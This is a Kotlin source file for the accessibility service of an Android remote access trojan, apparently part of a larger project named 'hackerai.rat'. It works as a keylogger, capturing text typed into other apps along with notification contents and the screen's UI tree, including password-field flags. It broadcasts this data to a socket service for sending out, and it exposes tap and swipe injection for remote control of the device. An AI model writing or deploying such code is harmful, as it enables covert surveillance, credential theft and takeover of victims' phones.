package com.hackerai.rat.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.hackerai.rat.RATApplication

class RATAccessibilityService : AccessibilityService() {
    companion object {
        var instance: RATAccessibilityService? = null
        var screenNodes: String = "[]"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d("AccessibilityService", "Connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    if (event.text?.isNotEmpty() == true) {
                        val text = event.text.joinToString("")
                        if (text.isNotBlank()) {
                            val data = mapOf(
                                "deviceId" to RATApplication.deviceId,
                                "app" to (event.packageName?.toString() ?: "unknown"),
                                "text" to text,
                                "timestamp" to System.currentTimeMillis()
                            )
                            // Send keystroke via SocketService
                            val intent = Intent("com.hackerai.rat.KEYSTROKE_EVENT").apply {
                                putExtra("data", text)
                                putExtra("app", event.packageName?.toString() ?: "unknown")
                            }
                            sendBroadcast(intent)
                        }
                    }
                }

                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    val packageName = event.packageName?.toString() ?: ""
                    val text = if (event.text?.isNotEmpty() == true) event.text[0].toString() else ""
                    val title = event.contentDescription?.toString() ?: ""
                    
                    if (text.isNotBlank() || title.isNotBlank()) {
                        val intent = Intent("com.hackerai.rat.NOTIFICATION_EVENT").apply {
                            putExtra("packageName", packageName)
                            putExtra("title", title)
                            putExtra("text", text)
                        }
                        sendBroadcast(intent)
                    }
                }

                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    // Capture screen node tree
                    captureScreenNodes()
                }
            }
        } catch (e: Exception) {
            Log.e("AccessibilityService", "Event error", e)
        }
    }

    private fun captureScreenNodes() {
        try {
            val root = rootInActiveWindow ?: return
            val nodes = mutableListOf<Map<String, Any?>>()
            extractNodeInfo(root, nodes)
            screenNodes = org.json.JSONArray(nodes.map { JSONObject(it) }).toString()
            root.recycle()
        } catch (e: Exception) {
            Log.e("AccessibilityService", "Node capture error", e)
        }
    }

    private fun extractNodeInfo(node: AccessibilityNodeInfo, result: MutableList<Map<String, Any?>>, depth: Int = 0) {
        if (depth > 10) return
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        
        val info = mutableMapOf<String, Any?>(
            "text" to (node.text?.toString() ?: ""),
            "contentDesc" to (node.contentDescription?.toString() ?: ""),
            "resourceId" to (node.viewIdResourceName ?: ""),
            "className" to node.className?.toString() ?: "",
            "bounds" to mapOf(
                "left" to bounds.left, "top" to bounds.top,
                "right" to bounds.right, "bottom" to bounds.bottom
            ),
            "clickable" to node.isClickable,
            "checkable" to node.isCheckable,
            "checked" to node.isChecked,
            "focusable" to node.isFocusable,
            "enabled" to node.isEnabled,
            "password" to node.isPassword
        )
        result.add(info)

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            extractNodeInfo(child, result, depth + 1)
            child.recycle()
        }
    }

    fun injectTap(x: Float, y: Float) {
        val path = Path()
        path.moveTo(x, y)
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 1))
            .build()
        dispatchGesture(gesture, null, null)
    }

    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 200) {
        val path = Path()
        path.moveTo(x1, y1)
        path.lineTo(x2, y2)
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
            .build()
        dispatchGesture(gesture, null, null)
    }

    override fun onInterrupt() {
        Log.d("AccessibilityService", "Interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }

    private fun JSONObject(map: Map<String, Any?>): org.json.JSONObject {
        val json = org.json.JSONObject()
        map.forEach { (k, v) ->
            when (v) {
                is String -> json.put(k, v)
                is Int -> json.put(k, v)
                is Long -> json.put(k, v)
                is Double -> json.put(k, v)
                is Boolean -> json.put(k, v)
                is Map<*, *> -> json.put(k, JSONObject(v as Map<String, Any?>))
                null -> json.put(k, org.json.JSONObject.NULL)
                else -> json.put(k, v.toString())
            }
        }
        return json
    }
}
